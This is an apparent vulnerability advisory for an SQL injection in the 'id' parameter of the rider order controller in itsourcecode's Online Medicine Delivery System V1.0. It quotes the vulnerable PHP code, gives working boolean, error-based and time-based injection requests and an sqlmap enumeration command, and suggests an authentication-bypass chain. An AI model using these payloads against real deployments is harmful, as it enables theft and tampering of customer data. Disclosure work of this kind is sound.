# itsourcecode Online Medicine Delivery System V1.0 - SQL Injection Vulnerability via 'id' Parameter in '/rider/orders/controller.php'
---

## 1. Product Information
| Field | Value |
| --- | --- |
| **Product Name** | Online Medicine Delivery System |
| **Product Link** | [https://itsourcecode.com/free-projects/php-project/complete-online-medicine-delivery-system-with-sms-notification-in-php/](https://itsourcecode.com/free-projects/php-project/complete-online-medicine-delivery-system-with-sms-notification-in-php/) |
| **Vendor** | itsourcecode |
| **Affected Version** | V1.0 |
| **Authentication Required** | Yes, requires Admin login session |


## 2. Vulnerability Type
**SQL Injection**

---

## 3. Vulnerability Description
The rider backend order management controller `/rider/orders/controller.php` of Online Medicine Delivery System contains an SQL injection vulnerability in the order status update functionality. The functionality receives the `$_GET['id']` parameter and directly concatenates it into 4 different SQL statements within the same request:

1. `Order::pupdate()` — UPDATE order status
2. `Summary::update()` — UPDATE summary status
3. SELECT query — Query customer information for SMS notification
4. SELECT query — Query order product information for SMS notification

The `id` parameter is numeric-type and can be injected without closing quotes. This interface requires an Admin login session, but an attacker can combine it with the Employee authentication SQL injection bypass vulnerability of this system to obtain an Admin session without a password, effectively making this vulnerability exploitable by unauthenticated attackers.

**Affected Code**:

`rider/orders/controller.php:138-171`

```php
// Injection point 1: Order::pupdate() — UPDATE
$order = New Order();
$order->STATS = $status;
$order->pupdate($_GET['id']);

// Injection point 2: Summary::update() — UPDATE
$summary = New Summary();
$summary->ORDEREDSTATS = $status;
$summary->ORDEREDREMARKS = $remarks;
$summary->update($_GET['id']);

// Injection point 3: SELECT query — Customer information
$query = "SELECT * FROM `tblsummary` s ,`tblcustomer` c 
    WHERE s.`CUSTOMERID`=c.`CUSTOMERID` and ORDEREDNUM=".$_GET['id'];
$mydb->setQuery($query);
$cur = $mydb->loadSingleResult();

// Injection point 4: SELECT query — Order product information
$query = "SELECT * FROM `tblproduct` p,`tblorder` o, `tblsummary` s
    WHERE p.`PROID` = o.`PROID` AND o.`ORDEREDNUM` = s.`ORDEREDNUM` 
    AND o.`ORDEREDNUM`=".$_GET['id'];
$mydb->setQuery($query);
$cur = $mydb->loadResultList();
```

## 4. Impact
+ **Full Database Data Disclosure**: Through injection, arbitrary database data can be extracted, including customer phone numbers, addresses, password hashes, and other private information
+ **Order Data Tampering**: Through UPDATE injection, arbitrary order statuses, amounts, and other information can be modified
+ **SMS Bombing**: The results of injection points 3 and 4 are used to construct INSERT statements into the `messageout` table for SMS; malicious construction may trigger SMS bombing

---

## 5. PoC
**Boolean-based Blind Injection**:

```plain
GET /rider/orders/controller.php?action=edit&actions=confirm&id=1 AND 7211=(SELECT (CASE WHEN (7211=7211) THEN 7211 ELSE (SELECT 7008 UNION SELECT 9301) END))-- - HTTP/1.1
Host: ******
Cookie: PHPSESSID=<admin_session>
Connection: close
```

**Error-based Injection**:

```plain
GET /rider/orders/controller.php?action=edit&actions=confirm&id=1 OR (SELECT 9614 FROM(SELECT COUNT(*),CONCAT(0x717a6b7071,(SELECT (ELT(9614=9614,1))),0x7170787671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) HTTP/1.1
Host: ******
Cookie: PHPSESSID=<admin_session>
Connection: close
```

**Time-based Blind Injection**:

```plain
GET /rider/orders/controller.php?action=edit&actions=confirm&id=1 AND (SELECT 7809 FROM (SELECT(SLEEP(5)))dflK) HTTP/1.1
Host: ******
Cookie: PHPSESSID=<admin_session>
Connection: close
```

**sqlmap database enumeration**:

```bash
python sqlmap.py -u "http://******/rider/orders/controller.php?action=edit&actions=confirm&id=1" --cookie="PHPSESSID=<admin_session>" -p id --batch --dbs --dbms=mysql
```

Result:

```plain
available databases [6]:
[*] information_schema
[*] medicinedb
[*] mysql
[*] performance_schema
[*] roocms
[*] sys
```

sqlmap execution screenshot:

![image-20260716192838169](C:\Users\Shawn\AppData\Roaming\Typora\typora-user-images\image-20260716192838169.png)

---

## 6. Remediation
1. **Use Parameterized Queries**
2. **Input Type Validation**: The `id` parameter should be an integer

